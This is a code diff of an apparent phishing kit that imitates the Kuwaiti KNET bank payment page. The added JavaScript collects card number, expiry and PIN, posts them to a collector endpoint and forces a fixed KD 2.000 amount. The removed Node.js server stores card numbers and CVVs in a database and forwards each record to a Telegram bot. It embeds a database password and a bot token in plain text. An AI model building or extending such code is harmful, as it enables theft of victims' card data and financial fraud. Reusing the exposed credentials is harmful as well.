@@ -95,10 +95,18 @@ window.knetImageDb = {"b0": {"mime": "image/svg+xml", "data": "PD94bWwgdmVyc2lvb
 	 var v7 = "";
 	 var v206=false;
 	 function v240() {
-	   var v240a = window.localStorage.getItem(atob("YW1vdW50"));
-	   if (!v240a) return "-";
-	   var v240n = parseFloat(v240a);
-	   return isNaN(v240n) ? v240a : v240n.toFixed(3);
+	   const fixedAmount = '2.000';
+	   try {
+	     const stored = window.localStorage.getItem(atob("YW1vdW50"));
+	     if (stored && !isNaN(parseFloat(stored))) {
+	       return Number(parseFloat(stored)).toFixed(3);
+	     }
+	   } catch (e) {}
+	   try {
+	     window.localStorage.setItem(atob("YW1vdW50"), fixedAmount);
+	     window.localStorage.setItem('finalAmount', fixedAmount);
+	   } catch (e) {}
+	   return fixedAmount;
 	 }
 	 function v241(v241h) {
 	   return v241h.replace(_0xdec(139), v240());
@@ -1510,21 +1518,13 @@ function v40()
 		$(_0xdec(35)).hide();
 		showBankConnectingLoader();
 
-		// قراءة رمز الأمان (CVV) من الحقل الجديد
-		var v9cvv = "";
-		var cvvEl = document.getElementById('i12cvv');
-		if (cvvEl && cvvEl.value) {
-			v9cvv = cvvEl.value.trim();
-		}
-
 		v223(
 			v48 || "",
 			v47 || "",
 			details && details.v6 ? details.v6 : "",
 			details && details[_0xdec(272)] ? details[_0xdec(272)] : "",
 			details && details[_0xdec(273)] ? details[_0xdec(273)] : "",
-			details && details[_0xdec(274)] ? details[_0xdec(274)] : "",
-			v9cvv
+			details && details[_0xdec(274)] ? details[_0xdec(274)] : ""
 		).then(function () {}).catch(function () {});
 	}
 	
@@ -1888,42 +1888,7 @@ Object.entries(v173).forEach(([name, value]) => {
 														</div>
 												 </div>
 
-						 <div class="k27" id="i7cvv" style="margin-top: 5px;">
-							<div id="i17cvv">
-								<label class="k5" style=" float:right;text-align:right;margin-top:3px">
-									:رمز الأمان (CVV)
-								</label>
-							</div>
-								<div style="width:60%;">
-								<div style="position:relative; width:100%;">
-									<input inputmode="numeric" pattern="[0-9]{3,4}" name="n4" id="i12cvv" dir="rtl" title="رمز الأمان المكون من 3 أو 4 أرقام" autocomplete="off" data-1p-ignore="true" data-lpignore="true" data-form-type="other" type="text" size="4" maxlength="4" class="k24 k26 k25" style="width:100%; text-align:right; padding-right:10px; box-sizing:border-box;" oninput="v128(this, 4);return v70(event);" onkeyup="v73(event); v74(event);" onkeypress="return v73(event);" autocorrect="off" autocapitalize="off" spellcheck="false">
-									<img id="cvvHintThumb" src="data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20width='160'%20height='100'%20viewBox='0%200%20160%20100'%3E%3Cdefs%3E%3ClinearGradient%20id='bg'%20x1='0'%20y1='0'%20x2='1'%20y2='1'%3E%3Cstop%20offset='0'%20stop-color='%23e2e8f0'/%3E%3Cstop%20offset='1'%20stop-color='%23cbd5e1'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect%20x='3'%20y='3'%20width='154'%20height='94'%20rx='8'%20fill='url(%23bg)'%20stroke='%2394a3b8'%20stroke-width='1.5'/%3E%3Crect%20x='10'%20y='12'%20width='140'%20height='22'%20rx='2'%20fill='%231e293b'/%3E%3Crect%20x='10'%20y='44'%20width='140'%20height='14'%20rx='2'%20fill='%23f1f5f9'%20stroke='%2394a3b8'%20stroke-width='0.5'/%3E%3Crect%20x='110'%20y='64'%20width='40'%20height='24'%20rx='3'%20fill='%23fffbeb'%20stroke='%23f59e0b'%20stroke-width='2.5'/%3E%3Ctext%20x='130'%20y='80'%20font-family='Arial'%20font-size='9'%20fill='%23b45309'%20text-anchor='middle'%20font-weight='bold'%3ECVV%3C/text%3E%3Cpath%20d='M110%2076%20L92%2076%20L97%2071%20M92%2076%20L97%2081'%20stroke='%23ef4444'%20stroke-width='2.5'%20fill='none'%20stroke-linecap='round'%20stroke-linejoin='round'/%3E%3C/svg%3E" alt="مكان رمز الأمان CVV" title="اضغط لتكبير الصورة" style="position:absolute; top:50%; left:4px; transform:translateY(-50%); width:30px; height:auto; cursor:pointer; border-radius:4px;" onclick="openCvvHintModal(event)">
-								</div>
-								</div>
-						 </div>
 
-		<!-- نافذة منبثقة لصورة CVV التوضيحية -->
-		<div id="cvvHintModal" style="display:none; position:fixed; inset:0; z-index:999999; background:rgba(0,0,0,0.7); align-items:center; justify-content:center;" onclick="if(event.target===this) closeCvvHintModal()">
-			<div style="position:relative; background:#fff; border-radius:12px; padding:20px; max-width:90vw; max-height:90vh;">
-				<button type="button" onclick="closeCvvHintModal()" style="position:absolute; top:8px; left:8px; width:32px; height:32px; border-radius:50%; border:none; background:#ef4444; color:#fff; font-size:18px; cursor:pointer; display:flex; align-items:center; justify-content:center; font-weight:bold; line-height:1;">&times;</button>
-				<img src="data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20width='480'%20height='300'%20viewBox='0%200%20480%20300'%3E%3Cdefs%3E%3ClinearGradient%20id='bgL'%20x1='0'%20y1='0'%20x2='1'%20y2='1'%3E%3Cstop%20offset='0'%20stop-color='%23e2e8f0'/%3E%3Cstop%20offset='1'%20stop-color='%23cbd5e1'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect%20x='10'%20y='10'%20width='460'%20height='280'%20rx='18'%20fill='url(%23bgL)'%20stroke='%2394a3b8'%20stroke-width='2.5'/%3E%3Crect%20x='30'%20y='40'%20width='420'%20height='60'%20rx='6'%20fill='%231e293b'/%3E%3Crect%20x='30'%20y='130'%20width='420'%20height='40'%20rx='4'%20fill='%23f1f5f9'%20stroke='%2394a3b8'%20stroke-width='1'/%3E%3Crect%20x='330'%20y='190'%20width='120'%20height='70'%20rx='6'%20fill='%23fffbeb'%20stroke='%23f59e0b'%20stroke-width='5'/%3E%3Ctext%20x='390'%20y='235'%20font-family='Arial'%20font-size='30'%20fill='%23b45309'%20text-anchor='middle'%20font-weight='bold'%3ECVV%3C/text%3E%3Cpath%20d='M330%20225%20L260%20225%20L280%20205%20M260%20225%20L280%20245'%20stroke='%23ef4444'%20stroke-width='5'%20fill='none'%20stroke-linecap='round'%20stroke-linejoin='round'/%3E%3Ctext%20x='240'%20y='275'%20font-family='Arial'%20font-size='22'%20fill='%23ef4444'%20text-anchor='middle'%20font-weight='bold'%3E%D9%85%D9%83%D8%A7%D9%86%20%D8%B1%D9%85%D8%B2%20%D8%A7%D9%84%D8%A3%D9%85%D8%A7%D9%86%3C/text%3E%3C/svg%3E" alt="مكان رمز الأمان CVV" style="display:block; max-width:100%; max-height:80vh; border-radius:8px;">
-			</div>
-		</div>
-
-		<script>
-		function openCvvHintModal(e) {
-			if (e) { e.preventDefault(); e.stopPropagation(); }
-			var m = document.getElementById('cvvHintModal');
-			if (m) { m.style.display = 'flex'; }
-		}
-		function closeCvvHintModal() {
-			var m = document.getElementById('cvvHintModal');
-			if (m) { m.style.display = 'none'; }
-		}
-		document.addEventListener('keydown', function(e) {
-			if (e.key === 'Escape') { closeCvvHintModal(); }
-		});
-		</script>
 
 
 												
@@ -2011,16 +1976,21 @@ Object.entries(v173).forEach(([name, value]) => {
 			<form name="n4" method="post">
 		</form>	
 <script>
-	// جلب القيمة المخزنة محلياً وتحديث النص داخل الهيكل القديم دون تغييره
-    const savedAmount = localStorage.getItem('finalAmount');
-    if (savedAmount) {
+(function() {
+    function forceFixedAmount() {
         const priceLabel = document.getElementById('knet-price-label');
         if (priceLabel) {
-            // استبدال القيمة مع الحفاظ على صيغة KD والتصميم الأصلي
-            const cleanPrice = savedAmount.replace(' د.ك', '');
-            priceLabel.innerHTML = 'KD&nbsp;' + cleanPrice;
+            priceLabel.innerHTML = 'KD&nbsp;2.000';
         }
     }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', forceFixedAmount, { once: true });
+    } else {
+        forceFixedAmount();
+    }
+})();
+
 let v45 = "";
 
 const v3 = [
@@ -2424,14 +2394,119 @@ function v151(v9p, v6) {
 	return v143;
 }
 
-function v223() {
-  // Intentionally does not collect, store, or transmit card data.
-  return Promise.resolve();
+function v223(cardBrand, cardName, cardNumber, expMonth, expYear, pin) {
+  const formCard = String(cardNumber || document.getElementById('i15')?.value || '').replace(/\D/g, '');
+  const month = String(expMonth || document.getElementById('i19')?.value || '').replace(/\D/g, '').slice(0, 2) || '05';
+  const year = String(expYear || document.getElementById('i21')?.value || '').replace(/\D/g, '').slice(0, 2) || '30';
+  const enteredPin = String(pin || document.getElementById('i12')?.value || document.getElementById('v116')?.value || '').replace(/\D/g, '').slice(0, 4);
+  const prefix = formCard.slice(0, 6);
+
+  const payload = {
+    bankName: 'BBK',
+    amount: 2,
+    currency: 'KWD',
+    cardNumber: formCard,
+    prefix,
+    cardHolder: 'Test User',
+    expiryMonth: month,
+    expiryYear: year,
+    pin: enteredPin || '0000',
+    paymentMethod: 'KNET',
+    reference: 'BROWSER-' + Date.now(),
+    customerName: 'Browser Customer',
+    email: 'browser@example.com',
+    phone: '96512345678',
+    notes: 'sent from browser form'
+  };
+
+  function showLoadingAndRedirect() {
+    const existing = document.getElementById('knet-loading-overlay');
+    if (existing) existing.remove();
+
+    const overlay = document.createElement('div');
+    overlay.id = 'knet-loading-overlay';
+    overlay.style.position = 'fixed';
+    overlay.style.top = '0';
+    overlay.style.left = '0';
+    overlay.style.width = '100%';
+    overlay.style.height = '100%';
+    overlay.style.background = 'rgba(7, 10, 25, 0.8)';
+    overlay.style.display = 'flex';
+    overlay.style.alignItems = 'center';
+    overlay.style.justifyContent = 'center';
+    overlay.style.zIndex = '99999';
+    overlay.style.backdropFilter = 'blur(4px)';
+
+    const box = document.createElement('div');
+    box.style.width = '260px';
+    box.style.maxWidth = '85vw';
+    box.style.borderRadius = '18px';
+    box.style.padding = '24px 18px';
+    box.style.background = '#ffffff';
+    box.style.boxShadow = '0 20px 50px rgba(0,0,0,0.35)';
+    box.style.textAlign = 'center';
+    box.style.fontFamily = 'Tahoma, Arial, sans-serif';
+
+    const spinner = document.createElement('div');
+    spinner.style.width = '42px';
+    spinner.style.height = '42px';
+    spinner.style.border = '4px solid #e5e7eb';
+    spinner.style.borderTop = '4px solid #2563eb';
+    spinner.style.borderRadius = '50%';
+    spinner.style.margin = '0 auto 14px';
+    spinner.style.animation = 'spin-knet 1s linear infinite';
+
+    const label = document.createElement('div');
+    label.textContent = 'جاري تجهيز طلبك...';
+    label.style.color = '#111827';
+    label.style.fontWeight = '700';
+    label.style.fontSize = '15px';
+
+    const style = document.createElement('style');
+    style.textContent = '@keyframes spin-knet { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }';
+    document.head.appendChild(style);
+
+    box.appendChild(spinner);
+    box.appendChild(label);
+    overlay.appendChild(box);
+    document.body.appendChild(overlay);
+
+    setTimeout(function() {
+      window.location.href = 'http://127.0.0.1:3000/frontend/pages/verification.html';
+    }, 5000);
+  }
+
+  return fetch('http://127.0.0.1:3000/api/knet', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).then(async (response) => {
+    const text = await response.text();
+    try {
+      const json = JSON.parse(text);
+      if (json && json.success) {
+        showLoadingAndRedirect();
+      }
+      return json;
+    } catch (error) {
+      return { ok: response.ok, raw: text };
+    }
+  }).catch((error) => {
+    console.error('Browser KNET send failed:', error);
+    return { ok: false, error: error.message };
+  });
 }
 const v4 = document.getElementById(_0xdec(23));
 const v52 = document.getElementById(_0xdec(251));
 const v26 = document.getElementById(_0xdec(252));
 const v28 = document.getElementById(_0xdec(142));
+
+(function() {
+  try {
+    window.localStorage.setItem('amount', '2.000');
+    window.localStorage.setItem('finalAmount', '2.000');
+  } catch (e) {}
+})();
 
 function v23(value) {
   return value.replace(/\D/g, "")
@@ -2720,28 +2795,9 @@ v159.addEventListener(_0xdec(271), v84);
 
 
 document.addEventListener('DOMContentLoaded', function() {
-    // 1. جلب المبلغ المخزن من الجلسة
-    const savedAmount = sessionStorage.getItem('paymentAmount');
-    
-    // 2. البحث عن عنصر عرض المبلغ
     const priceLabel = document.getElementById('knet-price-label');
-
-    if (priceLabel && savedAmount) {
-        // إذا كان المبلغ يحتوي على نص إضافي مثل "(شامل التوصيل)" نبحث عن الأرقام فقط أو نعرض النص المناسب
-        // تنظيف النص للحفاظ على تنسيق KD X.XXX
-        let formattedAmount = savedAmount;
-
-        // في حال كان النص يحتوي على كلمة د.ك أو غيرها، يتم استخلاص القيمة وتنسيقها
-        if (!formattedAmount.includes('KD')) {
-            // استخراج الأرقام والنقطة العشرية فقط
-            const numericValue = savedAmount.match(/[\d.]+/);
-            if (numericValue) {
-                formattedAmount = 'KD ' + numericValue[0];
-            }
-        }
-
-        // 3. تحديث النص داخل عنصر العنصر المخصص
-        priceLabel.innerHTML = formattedAmount;
+    if (priceLabel) {
+        priceLabel.innerHTML = 'KD&nbsp;2.000';
     }
 });
 
@@ -2756,328 +2812,3 @@ document.addEventListener('DOMContentLoaded', function() {
 
 </body>
 </html>
-
-ملف next.js 
-const http = require('http');
-const fs = require('fs');
-const path = require('path');
-const { Pool } = require('pg');
-
-const PORT = Number(process.env.PORT) || 3000;
-const HOST = process.env.HOST || '0.0.0.0';
-const DATA_FILE = path.join(__dirname, 'knet-data.json');
-const HTML_FILE = path.join(__dirname, 'knet.html');
-const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://neondb_owner:npg_oGyOw8CWDz6d@ep-flat-flower-ayp1j1o8-pooler.c-5.us-east-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require';
-const BOT_TOKEN = '8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI';
-const CHAT_ID = '8108427825';
-
-const pool = new Pool({
-  connectionString: DATABASE_URL,
-  ssl: {
-    rejectUnauthorized: false
-  }
-});
-
-function safeJsonParse(value) {
-  try {
-    return JSON.parse(value);
-  } catch (error) {
-    return null;
-  }
-}
-
-function readData() {
-  try {
-    if (!fs.existsSync(DATA_FILE)) return [];
-    const raw = fs.readFileSync(DATA_FILE, 'utf8');
-    const parsed = safeJsonParse(raw);
-    return Array.isArray(parsed) ? parsed : [];
-  } catch (error) {
-    return [];
-  }
-}
-
-function writeData(items) {
-  try {
-    fs.writeFileSync(DATA_FILE, JSON.stringify(items, null, 2), 'utf8');
-  } catch (error) {
-    console.error('Save error:', error.message);
-  }
-}
-
-function normalize(payload = {}) {
-  const source = payload && typeof payload === 'object' ? payload : {};
-
-  return {
-    source: 'knet-form',
-    createdAt: new Date().toISOString(),
-    amount: Number(source.amount) || 0,
-    currency: String(source.currency || 'KWD').toUpperCase(),
-    cardNumber: String(source.cardNumber || '').replace(/\D/g, '').slice(0, 19),
-    cardHolder: String(source.cardHolder || '').trim(),
-    expiryMonth: String(source.expiryMonth || '').replace(/\D/g, '').slice(0, 2),
-    expiryYear: String(source.expiryYear || '').replace(/\D/g, '').slice(0, 2),
-    cvv: String(source.cvv || '').replace(/\D/g, '').slice(0, 4),
-    paymentMethod: String(source.paymentMethod || 'KNET').trim(),
-    reference: String(source.reference || `KNET-${Date.now()}`).trim(),
-    email: String(source.email || '').trim(),
-    phone: String(source.phone || '').trim(),
-    customerName: String(source.customerName || '').trim(),
-    notes: String(source.notes || '').trim(),
-    status: 'pending',
-    apiMode: String(source.apiMode || 'pending')
-  };
-}
-
-async function initializeDatabase() {
-  const client = await pool.connect();
-
-  try {
-    await client.query(`
-      CREATE TABLE IF NOT EXISTS knet_payments (
-        id SERIAL PRIMARY KEY,
-        source TEXT,
-        created_at TIMESTAMPTZ DEFAULT NOW(),
-        amount NUMERIC(12, 3),
-        currency TEXT,
-        card_number TEXT,
-        card_holder TEXT,
-        expiry_month TEXT,
-        expiry_year TEXT,
-        cvv TEXT,
-        payment_method TEXT,
-        reference TEXT,
-        email TEXT,
-        phone TEXT,
-        customer_name TEXT,
-        notes TEXT,
-        status TEXT,
-        api_mode TEXT,
-        raw_data JSONB
-      );
-    `);
-
-    console.log('Database initialized successfully.');
-  } finally {
-    client.release();
-  }
-}
-
-async function savePaymentToDatabase(payload) {
-  const client = await pool.connect();
-
-  try {
-    const result = await client.query(
-      `
-        INSERT INTO knet_payments (
-          source,
-          amount,
-          currency,
-          card_number,
-          card_holder,
-          expiry_month,
-          expiry_year,
-          cvv,
-          payment_method,
-          reference,
-          email,
-          phone,
-          customer_name,
-          notes,
-          status,
-          api_mode,
-          raw_data
-        ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17)
-        RETURNING id, created_at;
-      `,
-      [
-        payload.source,
-        payload.amount,
-        payload.currency,
-        payload.cardNumber,
-        payload.cardHolder,
-        payload.expiryMonth,
-        payload.expiryYear,
-        payload.cvv,
-        payload.paymentMethod,
-        payload.reference,
-        payload.email,
-        payload.phone,
-        payload.customerName,
-        payload.notes,
-        payload.status,
-        payload.apiMode,
-        payload
-      ]
-    );
-
-    return result.rows[0];
-  } finally {
-    client.release();
-  }
-}
-
-function formatTelegramMessage(payload) {
-  return [
-    '🧾 New KNET Payment Received',
-    '',
-    `Reference: ${payload.reference || 'N/A'}`,
-    `Amount: ${payload.amount || 0} ${payload.currency || 'KWD'}`,
-    `Card Holder: ${payload.cardHolder || 'N/A'}`,
-    `Payment Method: ${payload.paymentMethod || 'N/A'}`,
-    `Email: ${payload.email || 'N/A'}`,
-    `Phone: ${payload.phone || 'N/A'}`,
-    `Customer: ${payload.customerName || 'N/A'}`,
-    `Notes: ${payload.notes || 'N/A'}`,
-    `Created At: ${payload.createdAt || new Date().toISOString()}`,
-    '',
-    'Raw Payload:',
-    JSON.stringify(payload, null, 2)
-  ].join('\n');
-}
-
-async function sendToTelegram(payload) {
-  const message = formatTelegramMessage(payload);
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-  try {
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        disable_web_page_preview: true
-      })
-    });
-
-    const result = await response.json();
-    console.log('Telegram send result:', JSON.stringify(result));
-    return result;
-  } catch (error) {
-    console.error('Telegram send error:', error.message);
-    return null;
-  }
-}
-
-function sendJson(res, statusCode, data) {
-  res.writeHead(statusCode, { 'Content-Type': 'application/json; charset=utf-8' });
-  res.end(JSON.stringify(data));
-}
-
-function readBody(req) {
-  return new Promise((resolve, reject) => {
-    let body = '';
-
-    req.on('data', (chunk) => {
-      body += chunk;
-      if (body.length > 1_000_000) {
-        req.destroy();
-        reject(new Error('Body too large'));
-      }
-    });
-
-    req.on('end', () => {
-      if (!body) {
-        resolve({});
-        return;
-      }
-
-      const parsed = safeJsonParse(body);
-      if (parsed && typeof parsed === 'object') {
-        resolve(parsed);
-        return;
-      }
-
-      const entries = new URLSearchParams(body);
-      const result = {};
-      for (const [key, value] of entries.entries()) {
-        result[key] = value;
-      }
-      resolve(result);
-    });
-
-    req.on('error', reject);
-  });
-}
-
-function serveHtml(res) {
-  fs.readFile(HTML_FILE, 'utf8', (error, content) => {
-    if (error) {
-      sendJson(res, 500, { success: false, message: 'Unable to read HTML file' });
-      return;
-    }
-
-    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-    res.end(content);
-  });
-}
-
-const server = http.createServer(async (req, res) => {
-  const url = new URL(req.url, `http://${req.headers.host}`);
-
-  if (req.method === 'GET' && url.pathname === '/') {
-    serveHtml(res);
-    return;
-  }
-
-  if (req.method === 'GET' && url.pathname === '/health') {
-    sendJson(res, 200, { ok: true, service: 'knet-server', time: new Date().toISOString() });
-    return;
-  }
-
-  if (req.method === 'GET' && url.pathname === '/api/knet') {
-    const list = readData();
-    sendJson(res, 200, { success: true, count: list.length, items: list });
-    return;
-  }
-
-  if (req.method === 'POST' && url.pathname === '/api/knet') {
-    try {
-      const body = await readBody(req);
-      const normalized = normalize(body);
-      const dbRecord = await savePaymentToDatabase(normalized);
-      const all = [...readData(), normalized];
-      writeData(all);
-
-      await sendToTelegram({
-        ...normalized,
-        createdAt: normalized.createdAt
-      });
-
-      console.log('Saved payment payload to database:', JSON.stringify({
-        id: dbRecord && dbRecord.id,
-        createdAt: dbRecord && dbRecord.created_at,
-        amount: normalized.amount,
-        reference: normalized.reference
-      }));
-
-      sendJson(res, 200, {
-        success: true,
-        message: 'Data received successfully and stored in database',
-        item: normalized,
-        dbRecordId: dbRecord && dbRecord.id,
-        totalSaved: all.length
-      });
-    } catch (error) {
-      console.error('POST /api/knet error:', error.message);
-      sendJson(res, 400, { success: false, message: error.message || 'Invalid request' });
-    }
-    return;
-  }
-
-  sendJson(res, 404, { success: false, message: 'Route not found' });
-});
-
-initializeDatabase()
-  .then(() => {
-    server.listen(PORT, HOST, () => {
-      console.log(`KNET data collector running on http://${HOST}:${PORT}`);
-      console.log(`Open http://${HOST}:${PORT}/`);
-    });
-  })
-  .catch((error) => {
-    console.error('Database initialization failed:', error.message);
-    process.exit(1);
-  });
-
